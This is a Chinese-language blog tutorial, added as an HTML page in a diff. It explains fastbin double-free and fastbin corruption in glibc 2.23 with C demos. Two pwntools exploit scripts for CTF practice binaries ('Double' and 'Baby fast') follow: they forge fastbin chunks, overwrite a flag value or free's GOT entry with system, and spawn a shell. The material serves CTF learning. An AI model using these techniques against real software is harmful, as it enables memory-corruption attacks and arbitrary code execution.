@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="堆漏洞之--Fastbin corruption  漏洞利用前提：  首先呢，对于这个漏洞，是在Fastbin上做文章，但是呢，这个漏洞的利用也是有前提条件的： 本质条件呢，是我们free掉chunk之后，并没有将指针置0，因此，我们也可以说，是存在UAF漏洞的。 在漏洞的利用方面，该漏洞要配合Double free漏洞，这个不用担心，存在UAF漏洞也意味着存在Double free漏洞的。 Do">
+<meta property="og:type" content="article">
+<meta property="og:title" content="堆漏洞之--Fastbin corruption">
+<meta property="og:url" content="http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/index.html">
+<meta property="og:site_name" content="WangYiHao">
+<meta property="og:description" content="堆漏洞之--Fastbin corruption  漏洞利用前提：  首先呢，对于这个漏洞，是在Fastbin上做文章，但是呢，这个漏洞的利用也是有前提条件的： 本质条件呢，是我们free掉chunk之后，并没有将指针置0，因此，我们也可以说，是存在UAF漏洞的。 在漏洞的利用方面，该漏洞要配合Double free漏洞，这个不用担心，存在UAF漏洞也意味着存在Double free漏洞的。 Do">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/1.png">
+<meta property="og:image" content="http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/2.png">
+<meta property="og:image" content="http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/3.png">
+<meta property="og:image" content="http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/4.png">
+<meta property="og:image" content="http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/5.png">
+<meta property="og:image" content="http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/6.png">
+<meta property="og:image" content="http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/8.png">
+<meta property="og:image" content="http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/9.png">
+<meta property="article:published_time" content="2024-08-29T06:35:08.000Z">
+<meta property="article:modified_time" content="2024-08-29T09:36:28.672Z">
+<meta property="article:author" content="SunRT">
+<meta property="article:tag" content="堆漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>堆漏洞之--Fastbin corruption</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2024/08/27/ZJCTF-2019-EasyHeap/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/&text=堆漏洞之--Fastbin corruption"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/&title=堆漏洞之--Fastbin corruption"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/&is_video=false&description=堆漏洞之--Fastbin corruption"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=堆漏洞之--Fastbin corruption&body=Check out this article: http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/&title=堆漏洞之--Fastbin corruption"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/&title=堆漏洞之--Fastbin corruption"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/&title=堆漏洞之--Fastbin corruption"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/&title=堆漏洞之--Fastbin corruption"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/&name=堆漏洞之--Fastbin corruption&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/&t=堆漏洞之--Fastbin corruption"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">堆漏洞之--Fastbin corruption</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞利用前提：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">Double free漏洞介绍：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">Fastbin corruption漏洞解析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text">例题解析：</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        堆漏洞之--Fastbin corruption
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SunRT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-08-29T06:35:08.000Z" itemprop="datePublished">2024-08-29</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%A0%86%E6%BC%8F%E6%B4%9E/" rel="tag">堆漏洞</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 align="center">堆漏洞之--Fastbin corruption</h1>
+
+<h2>漏洞利用前提：</h2>
+
+<p>首先呢，对于这个漏洞，是在Fastbin上做文章，但是呢，这个漏洞的利用也是有前提条件的：</p>
+<p>本质条件呢，是我们free掉chunk之后，并没有将指针置0，因此，我们也可以说，是存在UAF漏洞的。</p>
+<p>在漏洞的利用方面，该漏洞要配合Double free漏洞，这个不用担心，存在UAF漏洞也意味着存在Double free漏洞的。</p>
+<h2>Double free漏洞介绍：</h2>
+
+<p>Double free漏洞的成因是，我们将chunk进行free之后，并没有将指针置为零，导致这一块我们依然可以操作，所以我们可以再次调用free函数，对该chunk再一次释放。</p>
+<p>我们来做试验（测试环境为:glibc2.23）：</p>
+<p>实验源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEAP_SIZE 10</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span> *heap[HEAP_SIZE];</span><br><span class="line"></span><br><span class="line">    heap[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    heap[<span class="number">1</span>] = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    heap[<span class="number">2</span>] = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Chunk 1 address: %p\n&quot;</span>, heap[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Chunk 2 address: %p\n&quot;</span>, heap[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Chunk 3 address: %p\n&quot;</span>, heap[<span class="number">2</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(heap[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(heap[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">//free(heap[1]);</span></span><br><span class="line">    <span class="comment">//free(heap[0]);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们编译运行，当我们执行时，发现程序报错：</p>
+<p><img src="/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/1.png" alt="1"></p>
+<p>这是因为fastbin会检查，且有且检查下一个free的chunk是否和上一个相同，所以给了我们绕过的机会，只要我们先free(heap[0])，再free(heap[1])，再free(heap[0]）就可以绕过该检查，达到Double free的目的：</p>
+<p><img src="/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/2.png" alt="2"></p>
+<h2>Fastbin corruption漏洞解析：</h2>
+
+<p>Fastbin corruption漏洞就是在Double free漏洞的基础上(以上面为例)，再次mallco(0x10)，此时就可以申请到0x602000这块堆空间，如果题目可以在申请的chunk中做写入，那么当我们写入数据的时候，fd指针就会被我们改写(因为还有一块0x602000在fastbin中)（也就是上图的最后一块），那么就可以指向任意位置，那我们就可以继续mallco直到申请到我们想要的地方，达到任意位置写入。</p>
+<p>我们来做试验（测试环境为:glibc2.23）：</p>
+<p>实验源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span> *heap[<span class="number">10</span>];</span><br><span class="line">    </span><br><span class="line">    heap[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    heap[<span class="number">1</span>] = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(heap[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(heap[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>(heap[<span class="number">0</span>]);</span><br><span class="line">    </span><br><span class="line">    heap[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    read(<span class="number">0</span>,heap[<span class="number">3</span>],<span class="number">0x8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当我们read读入deadbeef时，便会：</p>
+<p><img src="/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/3.png" alt="3"></p>
+<h2>例题解析：</h2>
+
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1WGVqGuw0DfIl5ygZaGDMow?pwd=3txi">例1：[NewStarCTF 2023 公开赛道]Double</a></p>
+<p>先看一眼保护：</p>
+<p><img src="/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/4.png" alt="4"></p>
+<p><img src="/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/5.png" alt="5"></p>
+<p>是个菜单题目，而且呢，del函数中存在漏洞，这个菜单很短，只有申请和释放：</p>
+<p><img src="/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/6.png" alt="6"></p>
+<p>想拿到shell也不难，只要满足0x602070处的值是1638就可以了，我先放出payload，再做解释：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process(&quot;./Double&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29422</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,context</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Input idx\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Input content\n&quot;</span>)</span><br><span class="line">    sh.sendline(context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Input idx\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&quot;A&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;B&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk_addr = <span class="number">0x602060</span> </span><br><span class="line"></span><br><span class="line">payload = p64(fake_chunk_addr)</span><br><span class="line">add(<span class="number">2</span>,payload)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">&quot;deadbeef&quot;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">&quot;deadbeef&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x666</span>)</span><br><span class="line">add(<span class="number">5</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>问题的关键，就是fake_chunk_addr的筛选，按照我前面说的，大家是不是觉得，我们利用Fastbin corruption漏洞将fd指针改到哪里，我们就可以申请到哪里，其实并不是的，从fastbin中malloc，是要对即将malloc到的chunk做检查的，检查啥呢，该chunk的size区域，如果不符合该fastbin的大小，我们将无法进行申请，拿到该区域：</p>
+<p><img src="/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/8.png" alt="8"></p>
+<p>而我们要修改的区域0x602070处的前0x10字节，就有适合我们做伪造的区域。</p>
+<p>（注：对size域做检查的时候，只会检查前四个字节，并不会8字节全检查，所以，可伪造的区域也很多）</p>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1PdmHW7SHGsUX8RWn1pJa0w?pwd=98uf">例题2：Baby fast</a></p>
+<p>这道题目，与上到题目类似，大家可以试一试，看看能否独自攻破，这道题目，我选择的是改掉free函数的got，所以我选的fd指向的位置如下：</p>
+<p><img src="/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/9.png" alt="9"></p>
+<p>因为只检查前四个字节的缘故，这一段也可以哦，payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">	sh.recvuntil(<span class="string">&quot; : &quot;</span>)</span><br><span class="line">	sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">&quot; : &quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	sh.recvuntil(<span class="string">&quot; : &quot;</span>)</span><br><span class="line">	sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfree</span>(<span class="params">indx</span>):</span><br><span class="line">	sh.recvuntil(<span class="string">&quot; : &quot;</span>)</span><br><span class="line">	sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">&quot; : &quot;</span>)</span><br><span class="line">	sh.sendline(<span class="built_in">str</span>(indx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">&quot;deadbeef&quot;</span>) <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">&quot;deadbeef&quot;</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">dfree(<span class="number">0</span>)</span><br><span class="line">dfree(<span class="number">1</span>)</span><br><span class="line">dfree(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk_addr = <span class="number">0x601ffa</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">system_plt_addr = elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x50</span>,p64(fake_chunk_addr)) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">&quot;deadbeef&quot;</span>) <span class="comment"># 3</span></span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">&quot;A&quot;</span>*<span class="number">0xe</span> + p64(system_plt_addr)) <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dfree(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">堆漏洞之--Fastbin corruption</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞利用前提：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">Double free漏洞介绍：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">Fastbin corruption漏洞解析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text">例题解析：</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/&text=堆漏洞之--Fastbin corruption"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/&title=堆漏洞之--Fastbin corruption"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/&is_video=false&description=堆漏洞之--Fastbin corruption"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=堆漏洞之--Fastbin corruption&body=Check out this article: http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/&title=堆漏洞之--Fastbin corruption"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/&title=堆漏洞之--Fastbin corruption"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/&title=堆漏洞之--Fastbin corruption"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
